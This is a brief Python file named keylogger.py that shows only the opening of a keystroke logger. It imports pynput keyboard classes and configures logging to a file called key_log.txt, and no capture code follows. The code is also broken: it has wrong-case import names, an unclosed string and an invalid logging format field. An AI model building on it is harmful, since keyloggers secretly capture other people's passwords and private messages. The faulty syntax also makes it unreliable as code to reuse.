#
#
# keylogger.py

from pynput.keyboard import key, listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir) + "key_log.txt), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')

